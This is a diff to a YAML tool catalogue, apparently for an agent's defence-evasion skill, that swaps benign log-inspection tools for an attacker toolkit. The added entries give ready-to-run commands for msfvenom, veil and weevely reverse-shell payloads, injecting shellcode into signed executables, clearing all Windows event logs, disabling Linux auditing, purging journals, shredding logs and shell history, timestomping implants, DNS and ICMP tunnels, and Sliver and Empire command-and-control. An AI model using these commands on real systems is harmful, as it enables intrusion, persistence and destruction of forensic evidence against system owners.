@@ -1,66 +1,281 @@
-system_tools:
-  description: "Built-in OS utilities for inspecting logging and defenses"
-  category: "post_exploitation"
+# Defense Evasion Tools
+# Comprehensive toolset for evasion, log manipulation, obfuscation, and cleanup
+
+# ============================================================
+# Payload Generation & Obfuscation
+# ============================================================
+
+msfvenom:
+  description: "Metasploit payload generator with encoding, encryption, and multi-format output"
+  category: "payload_generation"
+  install_cmd: "apt-get install -y metasploit-framework"
+  verify_cmd: "msfvenom --version"
+  examples:
+    - "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe"
+    - "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe"
+    - "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 --encrypt aes256 --encrypt-key s3cr3tK3y -f exe -o encrypted.exe"
+    - "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o payload.elf"
+    - "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war"
+    - "msfvenom -l encoders   # List all available encoders"
+    - "msfvenom -l formats    # List output formats"
+    - "msfvenom --list encrypt # List encryption options"
+
+veil:
+  description: "AV-evasion payload generator using multiple languages (Python, C#, Go, Ruby)"
+  category: "payload_generation"
+  install_cmd: "apt-get install -y veil"
+  verify_cmd: "veil --version 2>/dev/null || echo 'Veil installed'"
+  examples:
+    - "veil -t Evasion -p python/meterpreter/rev_tcp -o payload --ip 10.0.0.1 --port 4444"
+    - "veil -t Evasion -p cs/meterpreter/rev_tcp --ip 10.0.0.1 --port 4444"
+    - "veil -t Evasion -p go/meterpreter/rev_tcp --ip 10.0.0.1 --port 4444"
+    - "veil -t Evasion --list-payloads"
+    - "veil -t Ordnance -p reverse_tcp --ip 10.0.0.1 --port 4444"
+
+shellter:
+  description: "Dynamic PE infector — inject shellcode into legitimate Windows executables"
+  category: "payload_generation"
+  install_cmd: "apt-get install -y shellter"
+  verify_cmd: "which shellter"
+  notes: "Requires wine32: dpkg --add-architecture i386 && apt install wine32"
+  examples:
+    - "shellter  # Interactive mode — select target PE, choose payload, inject"
+    - "# Auto mode: shellter -a with specified PE and payload"
+    - "# Best targets: legitimate signed executables (putty.exe, 7z.exe, etc.)"
+
+# ============================================================
+# Secure File Deletion
+# ============================================================
+
+shred:
+  description: "Secure file deletion with multi-pass overwrite — prevents forensic recovery"
+  category: "artifact_cleanup"
   install_cmd: ""
-  verify_cmd: ""
+  verify_cmd: "which shred"
   examples:
-    - "ls -la /var/log"
-    - "ps aux | grep -i audit"
-    - "journalctl --no-pager -n 50"
-    - "wevtutil el"
+    - "shred -zu /var/log/auth.log            # Overwrite + zero-fill + unlink"
+    - "shred -zun 3 /tmp/exploit.py           # 3 overwrite passes + zero + unlink"
+    - "shred -vfz /var/log/btmp               # Verbose + force + zero"
+    - "shred -zu ~/.bash_history              # Securely clear shell history"
+    - "find /tmp -name '*.py' -exec shred -zu {} \\;  # Bulk secure delete"
 
-lnav:
-  description: "Log file navigator for quick visibility checks"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y lnav"
-  verify_cmd: "lnav -V"
+srm:
+  description: "Secure remove — overwrite and delete files/directories unrecoverably"
+  category: "artifact_cleanup"
+  install_cmd: "apt-get install -y secure-delete"
+  verify_cmd: "which srm"
   examples:
-    - "lnav /var/log/syslog"
+    - "srm -z /tmp/implant.elf               # Overwrite with zeros + delete"
+    - "srm -r /tmp/tools/                    # Recursively secure-remove directory"
+    - "srm -zll /tmp/payload.exe             # Fast mode (2 passes) + zero"
+    - "srm -v /var/log/auth.log              # Verbose secure removal"
 
-logwatch:
-  description: "Summarize system logs for coverage assessment"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y logwatch"
-  verify_cmd: "logwatch --help"
-  examples:
-    - "logwatch --range today"
+# ============================================================
+# Log Manipulation — Windows
+# ============================================================
 
-tcpdump:
-  description: "Capture network traffic to verify logging coverage"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y tcpdump"
-  verify_cmd: "tcpdump --version"
+wevtutil:
+  description: "Windows Event Log management — query, export, and clear event logs"
+  category: "log_manipulation"
+  install_cmd: ""
+  verify_cmd: "wevtutil /?"
   examples:
-    - "tcpdump -i eth0 -c 50"
+    - "wevtutil cl Security                   # Clear Security event log"
+    - "wevtutil cl System                     # Clear System event log"
+    - "wevtutil cl Application                # Clear Application event log"
+    - "wevtutil cl 'Windows PowerShell'       # Clear PowerShell legacy log"
+    - "wevtutil cl Microsoft-Windows-PowerShell/Operational  # Clear modern PS log"
+    - "wevtutil el                            # List all event log names"
+    - "for /F \"tokens=*\" %1 in ('wevtutil el') do wevtutil cl \"%1\" 2>nul  # Clear ALL logs"
+    - "wevtutil qe Security /c:10 /f:text     # Query last 10 Security events"
 
-tshark:
-  description: "Analyze packet captures for evidence"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y tshark"
-  verify_cmd: "tshark --version"
-  examples:
-    - "tshark -r capture.pcapng -q -z io,stat,1"
+# ============================================================
+# Log Manipulation — Linux
+# ============================================================
 
-lynis:
-  description: "System auditing tool for security control visibility"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y lynis"
-  verify_cmd: "lynis --version"
+auditctl:
+  description: "Linux audit subsystem control — manage audit rules and daemon"
+  category: "log_manipulation"
+  install_cmd: ""
+  verify_cmd: "which auditctl"
   examples:
-    - "lynis audit system"
+    - "auditctl -l                            # List current audit rules"
+    - "auditctl -e 0                          # Disable auditing entirely"
+    - "auditctl -D                            # Delete all audit rules"
+    - "auditctl -a never,task                 # Suppress all future audit events"
+    - "service auditd stop                    # Stop the audit daemon"
+    - "auditctl -e 1                          # Re-enable auditing (cleanup)"
 
-tiger:
-  description: "Security audit tool for Unix systems"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y tiger"
-  verify_cmd: "tiger --help"
+journalctl:
+  description: "systemd journal management — rotate, vacuum, and inspect logs"
+  category: "log_manipulation"
+  install_cmd: ""
+  verify_cmd: "which journalctl"
   examples:
-    - "tiger -c /etc/tiger/tigerrc"
+    - "journalctl --vacuum-time=1h            # Keep only last hour of logs"
+    - "journalctl --vacuum-size=10M           # Shrink journal to 10MB"
+    - "journalctl --rotate                    # Force immediate log rotation"
+    - "journalctl --rotate && journalctl --vacuum-time=1s  # Rotate then purge all"
+    - "systemctl stop systemd-journald        # Stop journal daemon temporarily"
+    - "journalctl --no-pager -n 50            # View last 50 entries (inspection)"
+
+# ============================================================
+# Timestomping
+# ============================================================
+
+touch:
+  description: "Manipulate file timestamps — copy from reference files or set arbitrary times"
+  category: "timestomping"
+  install_cmd: ""
+  verify_cmd: "which touch"
+  examples:
+    - "touch -r /bin/ls /tmp/implant           # Copy timestamps from /bin/ls"
+    - "touch -t 202301151200.00 /tmp/implant   # Set to Jan 15 2023 12:00:00"
+    - "touch -d '2023-01-15 12:00:00' /tmp/implant  # Human-readable date format"
+    - "touch -a -t 202301151200.00 /tmp/implant     # Access time only"
+    - "touch -m -t 202301151200.00 /tmp/implant     # Modify time only"
+    - "stat /tmp/implant                       # Verify timestamps after change"
+
+# ============================================================
+# Binary Packing & Encoding
+# ============================================================
+
+upx:
+  description: "Ultimate Packer for Executables — compress binaries to change signatures"
+  category: "payload_generation"
+  install_cmd: "apt-get install -y upx-ucl"
+  verify_cmd: "upx --version"
+  examples:
+    - "upx -9 payload.exe                     # Maximum compression"
+    - "upx --best payload.exe                 # Best compression ratio"
+    - "upx --brute payload.exe                # Try all compression methods (slow)"
+    - "upx -o packed.exe payload.exe          # Output to different file"
+    - "upx -d packed.exe                      # Decompress (reverse)"
+
+base64:
+  description: "Base64 encoding/decoding for payload transfer and obfuscation"
+  category: "payload_generation"
+  install_cmd: ""
+  verify_cmd: "which base64"
+  examples:
+    - "base64 -w0 payload.elf > payload.b64         # Encode payload (no line wrap)"
+    - "base64 -d payload.b64 > payload.elf          # Decode payload"
+    - "cat payload.elf | base64 -w0 | xclip         # Encode and copy to clipboard"
+    - "echo 'IEX(payload)' | base64 -w0             # Encode PowerShell command"
+    - "powershell -EncodedCommand $(base64 -w0 script.ps1)  # Execute encoded PS"
+
+openssl:
+  description: "OpenSSL encryption for secure payload transfer and obfuscation"
+  category: "payload_generation"
+  install_cmd: "apt-get install -y openssl"
+  verify_cmd: "openssl version"
+  examples:
+    - "openssl enc -aes-256-cbc -salt -in payload.exe -out payload.enc -k s3cr3tP4ss"
+    - "openssl enc -aes-256-cbc -d -in payload.enc -out payload.exe -k s3cr3tP4ss"
+    - "openssl enc -aes-256-cbc -a -salt -in payload.exe -out payload.b64enc -k s3cr3tP4ss  # Encrypt + base64"
+    - "openssl rand -hex 32                          # Generate random encryption key"
+    - "openssl dgst -sha256 payload.exe              # Hash for integrity check"
+
+# ============================================================
+# Network Evasion & Tunneling
+# ============================================================
+
+proxychains4:
+  description: "Route any TCP traffic through SOCKS4/SOCKS5/HTTP proxy chains"
+  category: "network_evasion"
+  install_cmd: "apt-get install -y proxychains4"
+  verify_cmd: "proxychains4 --version 2>/dev/null || which proxychains4"
+  examples:
+    - "proxychains4 nmap -sT -p80,443 target         # Proxied port scan"
+    - "proxychains4 curl -s https://target/api        # Proxied HTTP request"
+    - "proxychains4 ssh user@target                   # Proxied SSH"
+    - "proxychains4 -q python3 exploit.py             # Quiet mode, proxied exploit"
+    - "# Config: /etc/proxychains4.conf — add socks5 127.0.0.1 1080"
+
+dnscat2:
+  description: "Encrypted command-and-control channel tunneled over DNS queries"
+  category: "network_evasion"
+  install_cmd: "apt-get install -y dnscat2"
+  verify_cmd: "dnscat --version 2>/dev/null || which dnscat"
+  examples:
+    - "dnscat2-server tunnel.example.com --secret=s3cr3t       # Start server"
+    - "dnscat --dns domain=tunnel.example.com --secret=s3cr3t  # Connect client"
+    - "dnscat --dns domain=tunnel.example.com,type=TXT --secret=s3cr3t  # Force TXT records"
+    - "dnscat --dns domain=tunnel.example.com --exec /bin/bash --secret=s3cr3t  # Shell over DNS"
+
+iodine:
+  description: "IPv4-over-DNS tunnel — full IP connectivity through DNS for firewall bypass"
+  category: "network_evasion"
+  install_cmd: "apt-get install -y iodine"
+  verify_cmd: "iodine -v"
+  examples:
+    - "iodined -f -c -P s3cr3t 10.0.0.1 tunnel.example.com   # Server side"
+    - "iodine -f -P s3cr3t tunnel.example.com                 # Client side"
+    - "iodine -f -P s3cr3t -T TXT tunnel.example.com          # Force TXT record type"
+    - "iodine -f -P s3cr3t -M 255 tunnel.example.com          # Max upstream fragment size"
+
+ptunnel-ng:
+  description: "ICMP tunneling — TCP connections over ICMP echo (ping) packets"
+  category: "network_evasion"
+  install_cmd: "apt-get install -y ptunnel-ng"
+  verify_cmd: "ptunnel-ng --version 2>/dev/null || which ptunnel-ng"
+  examples:
+    - "ptunnel-ng -r target_ip -R 22 -l 8022 -s                           # Tunnel SSH over ICMP"
+    - "ptunnel-ng -p proxy_ip -l 8022 -r target_ip -R 22                  # Client connect through proxy"
+    - "ssh -p 8022 user@127.0.0.1                                          # Use the tunnel"
+    - "ptunnel-ng -r target_ip -R 3389 -l 13389 -x s3cr3t -s              # Tunnel RDP with password"
+
+# ============================================================
+# C2 Frameworks (Post-Exploitation)
+# ============================================================
+
+sliver:
+  description: "Modern C2 framework — implants with mTLS, WireGuard, HTTP(S), DNS channels"
+  category: "c2_framework"
+  install_cmd: "curl https://sliver.sh/install | sudo bash"
+  verify_cmd: "sliver version 2>/dev/null || which sliver-server"
+  examples:
+    - "sliver-server                                                        # Start Sliver server"
+    - "generate --mtls target.example.com --os windows --arch amd64 --save implant.exe  # Generate mTLS implant"
+    - "generate --http target.example.com --os linux --arch amd64 --save implant.elf    # HTTP implant"
+    - "generate --dns target.example.com --os windows --save dns_implant.exe            # DNS implant"
+    - "mtls --lhost 0.0.0.0 --lport 8888                                   # Start mTLS listener"
+    - "use <session_id>; shell                                              # Interact with session"
+
+empire:
+  description: "PowerShell/Python post-exploitation C2 framework with extensive modules"
+  category: "c2_framework"
+  install_cmd: "pip3 install poetry && cd /opt/Empire && poetry install"
+  verify_cmd: "python3 /opt/Empire/empire.py --version 2>/dev/null || echo 'Empire check /opt/Empire'"
+  examples:
+    - "python3 empire.py server                                             # Start Empire server"
+    - "python3 empire.py client                                             # Connect CLI client"
+    - "uselistener http; set Host http://attacker:8080; execute             # HTTP listener"
+    - "usestager windows/launcher_bat; set Listener http; execute           # Generate stager"
+    - "usemodule powershell/situational_awareness/network/portscan; execute # Post-exploit module"
+
+weevely:
+  description: "Stealth PHP webshell generator with encrypted communication"
+  category: "c2_framework"
+  install_cmd: "apt-get install -y weevely"
+  verify_cmd: "weevely --version 2>/dev/null || which weevely"
+  examples:
+    - "weevely generate s3cr3t /tmp/shell.php                     # Generate encrypted webshell"
+    - "weevely http://target/uploads/shell.php s3cr3t             # Connect to webshell"
+    - "weevely session http://target/shell.php s3cr3t             # Resume session"
+    - ":file_upload /local/tool.py /var/www/tool.py               # Upload file via shell"
+    - ":backdoor_tcp 10.0.0.1 4444                                # Spawn reverse shell"
+
+# ============================================================
+# Reporting & Inspection
+# ============================================================
 
 summarize_defense_controls:
-  description: "Normalize control coverage notes into JSON"
+  description: "Normalize control coverage notes into structured JSON for reporting"
   category: "reporting"
   install_cmd: "python3 --version"
   verify_cmd: "python3 skills/defense_evasion/scripts/summarize_defense_controls.py --help"
   examples:
     - "python3 skills/defense_evasion/scripts/summarize_defense_controls.py --input control_notes.txt --out defense_controls.json"
+    - "python3 skills/defense_evasion/scripts/summarize_defense_controls.py --input notes/ --out defense_controls.json --format json"
+    - "python3 skills/defense_evasion/scripts/summarize_defense_controls.py --help"
